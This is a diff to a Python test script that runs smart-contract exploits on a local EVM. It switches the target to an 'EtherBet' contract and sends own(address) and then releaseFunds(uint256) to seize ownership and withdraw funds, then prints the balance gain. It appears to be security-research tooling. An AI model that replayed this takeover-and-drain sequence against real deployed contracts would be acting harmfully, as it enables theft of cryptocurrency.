@@ -26,6 +26,16 @@ def test():
     accounts = evm.getAccounts()
     print(accounts)
 
+def test_compile(datadir):
+    evm = EvmHandler()
+    for _filename in os.listdir(datadir):
+        contract_name = _filename.split('.')[0].split('#')[1]
+        filename = os.path.join(datadir, _filename)
+        with open(filename, 'r') as f:
+            text = f.read()
+        print(_filename)
+        contract = evm.compile(text, contract_name)
+
 
 def test_exploit_sample(datadir):
     filename = os.path.join(datadir, '0x6f905E47d3e6A9Cc286b8250181Ee5A0441Acc81#PRESENT_1_ETH.sol')
@@ -49,7 +59,7 @@ def test_exploit_sample(datadir):
     print("balance increment:", int(balance_1, 16) - int(balance, 16))
 
 def test_exploit(datadir):
-    filename = "0xde1fa94c7fa043fccf3938f47e9911ca584baed4#DailyGreed.sol"
+    filename = "0x3C3F481950FA627bb9f39A04bCCdc88f4130795b#EtherBet.sol"
     name = filename.split('.')[0].split('#')[1]
     filename = os.path.join(datadir, filename)
     evm = EvmHandler()
@@ -63,15 +73,15 @@ def test_exploit(datadir):
     accounts = evm.getAccounts()
     account = list(accounts.keys())[0]
     balance = accounts[account]
-    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["init()"])
+    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["own(address)"] + eth_abi.encode_abi(["address"], [account]).hex())
     print("trace:", [t["op"] for t in trace])
-    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["kill()"])
+    trace = evm.sendTx(account, address, "0", contract["functionHashes"]["releaseFunds(uint256)"] + eth_abi.encode_abi(["uint256"], [1]).hex())
     print("trace:", [t["op"] for t in trace])
     accounts = evm.getAccounts()
     balance_1 = accounts[account]
     print("balance increment:", int(balance_1, 16) - int(balance, 16))
 
 if __name__ == "__main__":
-    test()
-    # "/home/zqz/contracts" is my directory
-    # test_exploit("/home/zqz/contracts")
+    # test()
+    # test_compile("/home/zqz/teether_contract")
+    test_exploit("/home/zqz/teether_contract")
